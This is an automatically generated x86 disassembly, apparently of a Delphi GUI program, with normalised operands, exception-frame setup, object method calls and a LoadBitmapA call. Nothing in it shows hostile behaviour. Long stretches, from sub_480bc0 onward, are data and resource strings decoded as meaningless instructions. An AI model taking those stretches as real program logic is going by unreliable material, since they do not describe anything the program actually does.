lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
push [ ebp - 0xc ]
mov eax [ esi ]
add eax 0x8c
mov edx 0x3
call sub_40442c
dec ebx
jne r-xdata
mov eax [ esi ]
add eax 0x8c
mov ecx 0x1
mov edx 0x1
call sub_40460c
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov eax [ ebp - 0x10 ]
call sub_4083c4
shl eax 0x8
mov edx [ esi ]
mov [ edx + 0x94 ] eax
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov eax [ ebp - 0x14 ]
call sub_4083c4
mov edx [ esi ]
add [ edx + 0x94 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47df10
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x98 ]
mov [ eax + 0x70 ] ebx
mov eax [ esi ]
mov edx [ eax + 0x8c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov eax [ esi ]
mov edx [ eax + 0x94 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48048c
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_4040d0
retn
sub_4804d7
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ch
add [ eax ] al
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov al [ eax + 0x118 ]
test al al
jne r-xdata
cmp al 0x2
jne r-xdata
test dl dl
je r-xdata
push ebp
call sub_480114
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_4802b4
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
mov al 0x2
jmp r-xdata
sub_480520
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x84 ]
call sub_40436c
test eax eax
jle r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_404100
pop esi
pop ebx
retn
push [ ebx + 0x80 ]
push r-xdata
push [ ebx + 0x84 ]
mov eax esi
mov edx 0x3
call sub_40442c
pop esi
pop ebx
retn
sub_48056b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_47a714
xor eax eax
push ebp
push sub_4805bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x70 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
push ebp
push j_sub_403778#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x6c ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
push ebp
push sub_480649
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x6c ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
xor edx edx
push ebp
push j_sub_4038a4
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi [ ebx + 0x70 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4805c1
call sub_403a8c
call sub_403ae0
xor eax eax
push ebp
push j_sub_403778#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x6c ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
push ebp
push sub_480649
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x6c ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
xor edx edx
push ebp
push j_sub_4038a4
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi [ ebx + 0x70 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_480609
call sub_403a8c
call sub_403ae0
xor eax eax
push ebp
push sub_480649
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x6c ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
xor edx edx
push ebp
push j_sub_4038a4
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi [ ebx + 0x70 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_48064e
call sub_403a8c
call sub_403ae0
xor edx edx
push ebp
push j_sub_4038a4
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi [ ebx + 0x70 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4806b0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_47a890
mov [ edi + 0x68 ] esi
mov [ edi + 0x48 ] 0x0
mov [ edi + 0xf ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ edi + 0x74 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_480708
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x70 ]
call sub_40d564
lea eax [ esi + 0x6c ]
call sub_40d564
lea eax [ esi + 0x74 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47a928
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_480748
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_480934
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4808f1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4808e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x7c ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x68 ]
mov esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x7c ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x74 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx esi
mov eax ebx
call sub_418854
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_418854
push 0x0
push 0xfffffffe
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edi [ eax ]
call [ edi + 0x50 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4808e7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_418a0c
inc eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_418a0c
inc eax
jle r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_478c48
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x78
call sub_404100
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
call sub_40436c
test eax eax
jle r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_478c48
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
add eax 0x78
call sub_404100
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
call sub_40436c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_4808e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48093b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
sub_4808f6
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48093b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
sub_480944
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_480980
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480987
retn
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_404b54
sub_4809bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4809e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4809e8
retn
sub_480bc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + ecx * 2 ] cl
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xf004032 ] ah
inc ebp
dec ebp
inc ebx
dec ecx
inc esp
jbe r-xdata
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
arpl [ ebp + 0x45 ] sp
jb r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
mov eax 0x80004811
inc bp
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
fcom [ edi ]
outsd
jb r-xdata
test [ eax + eax - 0x8 ] 0x1a
inc edx
add al ah
pop ss
or al 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
or eax 0xdb00048
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xd ] al
dec eax
add [ esi + 0x2000480d ] bl
add eax [ eax ]
add [ eax - 0x43 ] dl
inc esp
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
test al 0x12
dec eax
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add al bh
adc cl [ eax ]
xor [ eax ] dh
dec eax
add [ eax + 0x20 ] cl
sub_480cb8
clc
sbb al [ ebp ]
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ eax + 0x3a ] ch
inc ebp
add [ eax - 0x77ffbae5 ] ch
pop esi
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add al ah
inc ebp
add ah bl
xor [ ebp ] eax
or al 0x30
inc ebp
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0xc8004560
jge r-xdata
dec eax
add [ eax - 0x6fffb7e3 ] al
sbb eax 0x1ecc0048
dec eax
add [ eax + 0x1f ] dl
dec eax
add [ edi + ebx + 0x48 ] bl
add [ eax + 0x1f ] ch
dec eax
add [ eax + 0x16 ] ch
dec eax
add [ eax + 0x1f ] dh
dec eax
add [ eax + 0x1a ] ch
dec eax
add [ eax + 0x48 ] cl
add [ ecx ] dl
dec eax
add [ ecx ] dh
dec eax
add [ ecx + 0x48 ] dl
add [ ecx + 0x48 ] dh
add [ esp + edx * 2 ] cl
dec ebp
imul esp [ fs : ecx + 0x50 ] 0x6579616c
jb r-xdata
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add ah dh
sbb [ eax ] ecx
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3180040 ] dl
add [ eax ] al
sldt [ ecx ]
add al [ ebx ]
add al [ eax ]
add al [ edx ]
add al [ edi ]
add [ eax ] cl
add [ edi - 0x43fffb00 ] al
push [ ebx - 0x4dfc4601 ]
push [ ecx - 0x9004f01 ]
push [ eax + 0x1d ]
inc eax
add [ eax ] bl
add eax [ eax ]
add [ edi ] cl
add [ ecx ] al
mov al 0xd
dec eax
add [ edi ] al
or al 0x54
dec ebp
imul esp [ fs : ecx + 0x50 ] 0x6579616c
jb r-xdata
add bh bh
in al dx
adc al 0x48
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x1
add [ eax ] al
or eax 0x6e450e00
or al 0x48
add [ eax + 0x240044be ] al
add [ edi ] al
dec ebp
push eax
insb
popad
jns r-xdata
add [ eax ] dl
inc eax
add [ 0x1dff0003 ] bl
je r-xdata
popad
bound ebp [ ebp + 0x64 ]
inc edx
jne r-xdata
add [ 0x6e450e00 ] cl
jb r-xdata
push esp
dec edi
jo r-xdata
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
bound ebp [ ebp ]
adc [ eax ] al
sbb eax 0x1dff0003
outsb
jae r-xdata
or eax [ eax ]
push cs
inc ebx
outsd
insb
outsd
jb r-xdata
add [ edx + ecx + 0x48 ] bl
add [ edx + eax + 0x1564ff00 ] ah
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x1
add [ eax ] al
add bh bh
je r-xdata
or [ gs : esp + eax * 2 + 0x30c00 ] bh
add [ edx ] cl
inc esp
jbe r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax + 0x1 ] al
or cl [ eax ]
mov al [ 0xffffffffa8ff0002 ]
adc eax 0x10048
add [ eax ] al
add [ eax ] al
add [ eax + 0x1ff ] al
push cs
add [ esi ] cl
push esi
imul esi [ ebx + 0x69 ] 0x42656c62
inc edx
jne r-xdata
adc [ eax ] al
push edi
add [ eax ] al
add al ch
sbb [ ebp ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
inc esp
jb r-xdata
jns r-xdata
arpl [ ebp + 0x54 ] sp
jo r-xdata
push edx
ja r-xdata
[ eax + 0x100482f ]
popad
inc ebp
outsb
popad
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
add bh bh
push ds
je r-xdata
je r-xdata
outsb
je r-xdata
add [ eax + 0x5308001a ] al
push 0x6948776f
outsb
je r-xdata
popad
adc [ eax ] al
0xc8ff0000 0x44f9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
popad
jns r-xdata
bound ebp [ ebp ]
imul esi [ ebx + 0x70 ] 0x9479616c
outsb
xor [ fs : ecx + 0x740044 ] ch
add [ esi ] bl
add eax [ eax ]
[ esi ]
outsb
jae r-xdata
jne r-xdata
inc edx
outsb
jae r-xdata
popad
inc ebp
add [ eax + 0x62 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
push [ edi + esi * 8 + 0x44 ]
0x7c0045 0xff00
outsb
jae r-xdata
inc esp
add [ eax + eax ] dh
inc [ eax + 0x1d ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
adc [ eax ] al
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ eax ] cl
inc esi
pop ds
add eax [ eax ]
[ edi ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ecx ] cl
push ebx
push 0x61657261
jb r-xdata
outsd
test al 0x44
add [ ecx ] ah
add bh bh
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
jmp [ ecx + edi * 8 - 0x693ffbc ]
imul ebp [ ebp + 0x4e ] 0x656d61
adc [ eax ] al
add [ eax + 0x46080016 ] al
imul ebp [ esi + 0x74 ] 0x480a7473
add ah dh
add al [ eax ]
[ edi + ebp + 0x48 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or al [ ebp + 0x76 ]
imul esp [ ebx + 0x65 ] 0x65707954
or [ esp + eax * 2 + 0x30c00 ] bh
add bh bh
inc eax
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or eax [ ebx + 0x6f ]
adc [ eax ] al
or al [ ecx + 0x75 ]
je r-xdata
add [ eax ] dl
inc eax
add [ ebx + eax ] bl
add bh bh
les edx [ eax + ecx * 2 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub_480e03
add [ fs : eax ] al
dec [ eax + 0x4518 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
pop esp
or cl [ eax ]
mov [ 0xffffffffecff0002 ] al
adc al 0x48
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x1
add [ eax ] al
or eax 0x6e450e00
popad
bound ebp [ ebp + 0x64 ]
inc edx
jne r-xdata
add [ eax ] dl
inc eax
add [ 0x1dff0003 ] bl
je r-xdata
push esp
dec edi
jo r-xdata
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
bound ebp [ ebp ]
adc [ eax ] al
sbb eax 0x1dff0003
outsb
jae r-xdata
add bh bh
je r-xdata
or [ gs : esp + eax * 2 + 0x30c00 ] bh
add [ edx ] cl
inc esp
jbe r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax + 0x1 ] al
or cl [ eax ]
mov al [ 0xffffffffa8ff0002 ]
adc eax 0x10048
add [ eax ] al
add [ eax ] al
add [ eax + 0x1ff ] al
push cs
add [ esi ] cl
push esi
imul esi [ ebx + 0x69 ] 0x42656c62
jne r-xdata
adc [ eax ] al
push edi
add [ eax ] al
add al ch
sbb [ ebp ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
inc esp
jb r-xdata
jns r-xdata
arpl [ ebp + 0x54 ] sp
jo r-xdata
push edx
ja r-xdata
[ eax + 0x100482f ]
popad
inc ebp
outsb
popad
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
add bh bh
push ds
je r-xdata
outsb
je r-xdata
add [ eax + 0x5308001a ] al
push 0x6948776f
outsb
je r-xdata
popad
adc [ eax ] al
0xc8ff0000 0x44f9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
popad
jns r-xdata
bound ebp [ ebp ]
imul esi [ ebx + 0x70 ] 0x9479616c
outsb
xor [ fs : ecx + 0x740044 ] ch
add [ esi ] bl
add eax [ eax ]
[ esi ]
outsb
jae r-xdata
popad
inc ebp
add [ eax + 0x62 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
push [ edi + esi * 8 + 0x44 ]
0x7c0045 0xff00
outsb
jae r-xdata
inc esp
add [ eax + eax ] dh
inc [ eax + 0x1d ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
adc [ eax ] al
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ eax ] cl
inc esi
pop ds
add eax [ eax ]
[ edi ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ecx ] cl
push ebx
push 0x61657261
jb r-xdata
outsd
outsb
jae r-xdata
test al 0x44
add [ ecx ] ah
add bh bh
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
jmp [ ecx + edi * 8 - 0x693ffbc ]
imul ebp [ ebp + 0x4e ] 0x656d61
adc [ eax ] al
add [ eax + 0x46080016 ] al
imul ebp [ esi + 0x74 ] 0x480a7473
add ah dh
add al [ eax ]
[ edi + ebp + 0x48 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or al [ ebp + 0x76 ]
imul esp [ ebx + 0x65 ] 0x65707954
or [ esp + eax * 2 + 0x30c00 ] bh
adc [ eax ] al
push eax
add [ eax ] al
add bh bh
inc eax
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or eax [ ebx + 0x6f ]
adc [ eax ] al
or al [ ecx + 0x75 ]
je r-xdata
add [ eax ] dl
inc eax
add [ ebx + eax ] bl
add bh bh
les edx [ eax + ecx * 2 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub_48100b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001a ] al
push 0x6948776f
outsb
je r-xdata
push [ edi + esi * 8 + 0x44 ]
add al ch
sbb [ ebp ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
0xc8ff0000 0x44f9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
0x7c0045 0xff00
outsb
je r-xdata
popad
inc ebp
add [ eax + 0x62 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
jmp [ ecx + edi * 8 - 0x693ffbc ]
sub_48131c
push ebx
push esi
push edi
push ebp
add esp 0xffffffbc
mov esi eax
lea ecx [ esp + 0x2c ]
xor edx edx
xor eax eax
call sub_417330
mov eax [ esp + 0x2c ]
mov [ esi + 0x2c0 ] eax
mov eax [ esp + 0x30 ]
mov [ esi + 0x2c4 ] eax
mov [ esp ] 0x0
mov ebp rw-data
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ esi + 0x2c4 ]
jle r-xdata
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ esi + 0x2c0 ] eax
inc ebx
add edi 0x4
cmp bl 0x3
jne r-xdata
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov [ esi + 0x2c4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
xor edx edx
mov dl bl
xor ecx ecx
mov cl [ esp ]
add ecx ecx
lea ecx [ esi + ecx * 8 ]
mov [ ecx + edx * 4 + 0x214 ] eax
push 0x1
mov eax [ edi ]
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] 0x6
mov eax [ ebp ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] 0x6
lea ecx [ esp + 0x38 ]
mov edx r-xdata
lea eax [ esp + 0x5 ]
call sub_408f64
push eax
mov eax [ rw-data ]
push eax
call LoadBitmapA
mov edx eax
xor eax eax
mov al bl
xor ecx ecx
mov cl [ esp ]
add ecx ecx
lea ecx [ esi + ecx * 8 ]
